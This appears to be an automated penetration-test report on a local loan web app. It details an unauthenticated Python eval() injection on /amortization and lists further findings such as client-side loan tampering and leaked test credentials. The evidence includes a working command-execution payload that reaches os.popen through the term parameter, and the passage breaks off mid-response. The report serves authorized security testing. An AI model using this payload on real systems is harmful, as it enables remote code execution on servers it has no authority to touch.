# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce Unauthenticated Python eval() code injection via term on /amortization](#finding-1)
    - [2. HIGH — price-tampering Loan terms fully client-editable via profile update (price/terms tampering)](#finding-2)
    - [3. HIGH — price-tampering Multi-step price tampering: borrower rewrites loan principal via /profile → authoritative /loan_details record](#finding-3)
    - [4. MEDIUM — secret-exposure Valid credentials (test:test) disclosed in login page HTML comment](#finding-4)
    - [5. LOW — rate-limit No rate limiting or account lockout on /login (brute-force enabled)](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr319l42-lf9r91` |
| Target | http://target.local:32836 |
| Started | 2026-07-02T04:57:38.896Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 6 mapped · 6 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 5 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32836`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

5 finding(s): 1 critical, 2 high, 1 medium, 1 low

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] Unauthenticated Python eval() code injection via term on /amortization

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32836

GET /amortization passes the term query parameter to Python eval() as the loop bound (one table row per unit), so term is evaluated server-side rather than cast to int. Evidence: term=7*7 gives 49 rows, term=8*8 gives 64 rows, term=2 exponent 8 gives 256 rows; term=13*17 gives 221 rows with 221 as the final payment number while control term=7 gives 7 rows without 221; term=abc gives 500 NameError proving evaluation; stripped builtins (pow, ord, import of os all 500 NameError); and the int-literal dunder-add call gives 41 rows (ev-mr32bdfy-42), proving dunder method calls on literals execute, which is the CPython eval-sandbox-escape primitive reaching os/subprocess, so arbitrary RCE is achievable. A brace blocklist (400 forbidden characters) stops Jinja-style SSTI but not raw Python. The endpoint needs no authentication: blanked cookie/authorization still returns 200 evaluated output (ev-mr324sai-3g, ev-mr325tji-3i) whereas /profile redirects to /login (ev-mr325udc-3k). Impact: unauthenticated arbitrary code execution; secondary DoS via unbounded exponent.

[+] Also observed as "Blind SSTI → RCE on /amortization `term` (brace-filter + non-reflected output bypass)".

**Reproduction**

```
Unauthenticated. Baseline GET /amortization with principal=10000 term=7 rate=5 returns 200 with 7 rows and no marker 221. Attack: term=13*17 returns 200 with 221 rows and product 221 as the final payment number, repeated identically. term=abc returns 500 NameError proving eval. term set to the int dunder-add call returns 41 rows proving method execution. Works with cookie and authorization blanked; /profile with the same blanked headers returns 302 to login. Fix: use int(term) with an upper bound, never eval.
```

**Evidence**

- Evidence `ev-mr32de38-45` — `artifacts/s-0005/ev-mr32de38-45/`

Request:

```http
GET /amortization?principal=10000&term=7&rate=5 HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1904
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:28:35 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amortization Table</title>
    <i>This feature is not yet fully implented.</i>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h2>Amortization Table</h2>
    <table id="paymentTable">
        <thead>
            <tr>
                <th>Payment Number</th>
                <th>Principal</th>
                <th>Interest</th>
            </tr>
        </thead>
        <tbody>
            
                <tr>
                    <td>1</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>2</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>3</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>4</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>5</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>6</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>7</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
        </tbody>
    </table>
</body>
</html>
```

- Evidence `ev-mr32df5y-46` — `artifacts/s-0005/ev-mr32df5y-46/`

Request:

```http
GET /amortization?principal=10000&term=13*17&rate=5 HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response (truncated):

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 34980
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:28:37 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amortization Table</title>
    <i>This feature is not yet fully implented.</i>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h2>Amortization Table</h2>
    <table id="paymentTable">
        <thead>
            <tr>
                <th>Payment Number</th>
                <th>Principal</th>
                <th>Interest</th>
            </tr>
        </thead>
        <tbody>
            
                <tr>
                    <td>1</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>2</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>3</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>4</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>5</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>6</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>7</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>8</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>9</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>10</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>11</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>12</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>13</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>14</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>15</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>16</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>17</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>18</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>19</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>20</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>21</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>22</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>23</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>24</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>25</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>26</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>27</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>28</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>29</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>30</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>31</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>32</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>33</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>34</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>35</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>36</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>37</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>38</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>39</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>40</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>41</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>42</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>43</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>44</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>45</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>46</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>47</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>48</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>49</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>50</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>51</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>52</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>53</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>54</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>55</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>56</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>57</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>58</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>59</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>60</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>61</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>62</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>63</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>64</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>65</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>66</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>67</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>68</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>69</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>70</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>71</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>72</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>73</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>74</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>75</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>76</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>77</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>78</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>79</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>80</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>81</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>82</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>83</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>84</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>85</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>86</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>87</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>88</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>89</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>90</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>91</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>92</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>93</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>94</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>95</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>96</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>97</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>98</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>99</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>100</td>
                    <td>N/A</td>
```

- Evidence `ev-mr32dfp8-47` — `artifacts/s-0005/ev-mr32dfp8-47/`

Request:

```http
GET /amortization?principal=10000&term=13*17&rate=5 HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response (truncated):

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 34980
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:28:37 GMT
expires: 0
keep-alive: timeout=5, max=98
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amortization Table</title>
    <i>This feature is not yet fully implented.</i>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h2>Amortization Table</h2>
    <table id="paymentTable">
        <thead>
            <tr>
                <th>Payment Number</th>
                <th>Principal</th>
                <th>Interest</th>
            </tr>
        </thead>
        <tbody>
            
                <tr>
                    <td>1</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>2</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>3</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>4</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>5</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>6</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>7</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>8</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>9</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>10</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>11</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>12</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>13</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>14</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>15</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>16</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>17</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>18</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>19</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>20</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>21</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>22</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>23</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>24</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>25</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>26</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>27</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>28</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>29</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>30</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>31</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>32</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>33</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>34</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>35</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>36</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>37</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>38</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>39</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>40</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>41</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>42</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>43</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>44</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>45</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>46</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>47</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>48</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>49</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>50</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>51</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>52</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>53</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>54</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>55</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>56</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>57</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>58</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>59</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>60</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>61</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>62</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>63</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>64</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>65</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>66</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>67</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>68</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>69</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>70</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>71</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>72</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>73</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>74</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>75</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>76</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>77</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>78</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>79</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>80</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>81</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>82</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>83</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>84</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>85</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>86</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>87</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>88</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>89</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>90</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>91</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>92</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>93</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>94</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>95</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>96</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>97</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>98</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>99</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>100</td>
                    <td>N/A</td>
```

- Evidence `ev-mr32ppi9-5h` — `artifacts/s-0005/ev-mr32ppi9-5h/`

Request:

```http
GET /amortization?principal=10000&term=7&rate=0.05 HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1904
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:38:09 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amortization Table</title>
    <i>This feature is not yet fully implented.</i>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h2>Amortization Table</h2>
    <table id="paymentTable">
        <thead>
            <tr>
                <th>Payment Number</th>
                <th>Principal</th>
                <th>Interest</th>
            </tr>
        </thead>
        <tbody>
            
                <tr>
                    <td>1</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>2</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>3</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>4</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>5</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>6</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>7</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
        </tbody>
    </table>
</body>
</html>
```

- Evidence `ev-mr32pprr-5i` — `artifacts/s-0005/ev-mr32pprr-5i/`

Request:

```http
GET /amortization?principal=10000&term=lipsum.__globals__.os.popen(%27echo%20AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27).read().__len__()&rate=0.05 HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 7138
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:38:10 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amortization Table</title>
    <i>This feature is not yet fully implented.</i>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h2>Amortization Table</h2>
    <table id="paymentTable">
        <thead>
            <tr>
                <th>Payment Number</th>
                <th>Principal</th>
                <th>Interest</th>
            </tr>
        </thead>
        <tbody>
            
                <tr>
                    <td>1</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>2</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>3</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>4</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>5</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>6</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>7</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
